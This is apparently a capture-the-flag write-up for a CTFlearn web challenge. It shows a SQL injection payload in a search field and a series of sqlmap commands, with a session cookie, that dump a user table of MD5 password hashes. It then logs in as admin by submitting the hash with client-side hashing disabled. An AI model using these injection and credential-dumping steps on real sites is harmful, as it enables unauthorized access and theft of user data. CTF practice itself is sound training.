so we get to a website: 38.197.193.132:5000
it has a login/register form.
we need to get admin login.
we try to connect with username:admin, password:12345, and we can see that the browser is hashing the password even before sending it to the client side form handler - 
it changes the password on the form for hash(password), which is md5.
<script>
        function hash() {
            document.form.password.value = md5(document.form.password.value);

            return true
        }
</script>

that means that we only need to get the md5 of the password of the admin, not the password itself. we can cancel the swich in the browswer, and it will sent the hashed password.

to get the hashed we need a SQL injection:
if we just register with random username, password, we see a search form:
<form class="uk-margin-large-top" action="/" method="post">
          <h4>Search our extensive list of hashbrowns</h4>
          
  <label for="search">Search</label>
  <input class="uk-input" id="search" name="search" required="" type="text" value="">
  

  <button type="submit">Search!</button>
</form>

which looks like that:
Search our extensive list of hashbrowns
Search :
(user input feild)
 Search button!
No hashbrowns came up for that search

so we can insert queries and get the results:
we can see easily that by simple injection of inserting:  ' OR ""='
we get:
Name:
Flagbrown
Description:
Only admins may view this hashbrown
Name:
Uncooked
Description:
You probably don't want to eat this type of hashbrown. Flag this one for review.
Name:
Perfect
Description:
Cooked to perfection, eat now.
Name:
Burnt
Description:
Not the best, but in a pinch, it works.

which means that Flagbrown is the feild of the flag, but we need to be admins to see that one.
so, we use the great sqlmap:
after quick tutorial you can see that we need to suply url with -u, -p with post data format, --data with post query example, and --method POST here.
to give the cookie for this to work, we can use --cookie.
from there it is strate forward:

1. we need to get the database name:
python3 sqlmap.py -u http://138.197.193.132:5000/ --data "search=Flagbrown" -p "search" --method POST --cookie="session=.eJyd
jktuwzAMRK8icG0EMiVLsk_RfREU4i824DaF5ayC3D0CeoOuSGI4b-YJX7bXtmqD5fMJ7uwDvrW1elMY4GPX2tTt95vbftx5d5W5i-5ct-Z--88Frq_hn77r0MMPbSss5_HQfm0CCxAHwSIWcKreiDVkKoicfKF5jlaQaqWMGjNnTHkmZtHCmE2V0Guyvgt64eJx5M5ipGlM
HSjmcw5RxpjqbBRtqpGkUgxBUla1WLjXfzQ9_sqEAq83sqVaWw.Xf6J-Q.N1xHHpXAavYCRaLu8PkKOkARPr0" --db


2. we need to get tables:
python3 sqlmap.py -u http://138.197.193.132:5000/ --data "search=Flagbrown" -p "search" --method POST --cookie="session=.eJyd
jktuwzAMRK8icG0EMiVLsk_RfREU4i824DaF5ayC3D0CeoOuSGI4b-YJX7bXtmqD5fMJ7uwDvrW1elMY4GPX2tTt95vbftx5d5W5i-5ct-Z--88Frq_hn77r0MMPbSss5_HQfm0CCxAHwSIWcKreiDVkKoicfKF5jlaQaqWMGjNnTHkmZtHCmE2V0Guyvgt64eJx5M5ipGlM
HSjmcw5RxpjqbBRtqpGkUgxBUla1WLjXfzQ9_sqEAq83sqVaWw.Xf6J-Q.N1xHHpXAavYCRaLu8PkKOkARPr0" -D preshashbrwon --tables


3. we need to get tables colums:
python3 sqlmap.py -u http://138.197.193.132:5000/ --data "search=Flagbrown" -p "search" --method POST --cookie="session=.eJyd
jktuwzAMRK8icG0EMiVLsk_RfREU4i824DaF5ayC3D0CeoOuSGI4b-YJX7bXtmqD5fMJ7uwDvrW1elMY4GPX2tTt95vbftx5d5W5i-5ct-Z--88Frq_hn77r0MMPbSss5_HQfm0CCxAHwSIWcKreiDVkKoicfKF5jlaQaqWMGjNnTHkmZtHCmE2V0Guyvgt64eJx5M5ipGlM
HSjmcw5RxpjqbBRtqpGkUgxBUla1WLjXfzQ9_sqEAq83sqVaWw.Xf6J-Q.N1xHHpXAavYCRaLu8PkKOkARPr0" --dump -D preshashbrown -T user --columns

4. we need to get tables content:
python3 sqlmap.py -u http://138.197.193.132:5000/ --data "search=Flagbrown" -p "search" --method POST --cookie="session=.eJyd
jktuwzAMRK8icG0EMiVLsk_RfREU4i824DaF5ayC3D0CeoOuSGI4b-YJX7bXtmqD5fMJ7uwDvrW1elMY4GPX2tTt95vbftx5d5W5i-5ct-Z--88Frq_hn77r0MMPbSss5_HQfm0CCxAHwSIWcKreiDVkKoicfKF5jlaQaqWMGjNnTHkmZtHCmE2V0Guyvgt64eJx5M5ipGlM
HSjmcw5RxpjqbBRtqpGkUgxBUla1WLjXfzQ9_sqEAq83sqVaWw.Xf6J-Q.N1xHHpXAavYCRaLu8PkKOkARPr0" --dump -D preshashbrown -T user

and we get:
+----+-------+-----------------------------------------------+---------------+
| id | admin | password                                      | username      |
+----+-------+-----------------------------------------------+---------------+
| 2  | 1     | 32E0C348B4A5BB41DB683BC5690B546F              | admin         |
| 3  | 0     | c5caa67d534c59d1db8a586a10c08157 (jowls)      | jowls         |
| 4  | 0     | a3aca2964e72000eea4c56cb341002a4 (hhh)        | ggggg         |
| 5  | 0     | 4297f44b13955235245b2497399d7a93 (123123)     | eladbeber619  |
| 6  | 0     | 8ce3f2de6a1e527b7e2b0c81807743e9 (' or 1=1--) | ' or 1=1--    |
| 7  | 0     | 202cb962ac59075b964b07152d234b70 (123)        | administrator |
| 8  | 0     | 4297f44b13955235245b2497399d7a93 (123123)     | salazar236    |
+----+-------+-----------------------------------------------+---------------+
means, that the admin hashed password is:  32E0C348B4A5BB41DB683BC5690B546F
we enter this in the form with hash on client canceld, and get into admin account.
after searching Flagbrown:

Name:
Flagbrown
Description:
This hashbrown is special, here is your flag: CTFlearn{h4shbr0wns_0n_th3_s3rv3r_@!#$<>[]}
and there is the flag.
